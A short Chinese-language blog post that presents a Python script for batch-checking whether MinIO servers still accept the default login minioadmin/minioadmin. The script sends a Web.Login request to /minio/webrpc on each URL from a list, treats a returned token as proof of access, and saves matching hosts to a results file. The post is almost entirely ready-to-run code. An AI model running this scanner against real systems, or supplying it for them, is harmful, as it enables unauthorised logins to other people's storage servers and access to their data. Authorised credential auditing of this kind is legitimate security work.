web默认口令检测工具
2021-09-16 15:39:58

前言：本文介绍一款web默认口令检测工具，通过构造默认口令，匹配返回包特征码，判断目标站点是否存在默认口令，适用于无验证码特定系统的默认口令检测，下面以批量检测minio系统做介绍。

minio的默认口令为minioadmin，minioadmin。下面直接给出代码，代码较简单不多做解释。

import requests

import urllib3

import argparse

import re

import base64

parser = argparse.ArgumentParser(description='帮助信息')

parser.add_argument('-u','--url',help="输入一个url",default='')

parser.add_argument('-f','--file',help="输入一个文件",default='')

args = parser.parse_args()

urllib3.disable_warnings()

name=f'''

使用方法：

python3 web弱口令批量探测.py -u http://ip:port

python3 web弱口令批量探测minio.py -f miniourl.txt(批量检测 http://ip:port)

'''

print(name)

def poc(url):

print('-'*50)

header ={'Content-Type': 'application/json',

'Host': '127.0.0.1',

'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',}

target = url +"/minio/webrpc"

#target = "http://" + url + "/minio/webrpc"

data = {

"id":1,

"jsonrpc":"2.0",

"params":{

"username":"minioadmin",

"password":"minioadmin"

},

"method":"Web.Login"

}

try:

r = requests.post(url=target,json=data,headers=header,timeout=6,verify=False)

if r.status_code ==200 and "token" in r.text:

print(url+" 漏洞存在！")

f = open('Minioresult.txt','a')

f.write(url+'\n')

f.close()

else:

print(url+" 漏洞不存在！")

except OSError:

pass

def more(file):

f = open(file,encoding='utf-8')

for i in f.readlines():

i = i.strip()

poc(i)

if __name__=="__main__":

if args.url !='' and args.file=='':

poc(args.url)

if args.url =='' and args.file !='':

more(args.file)
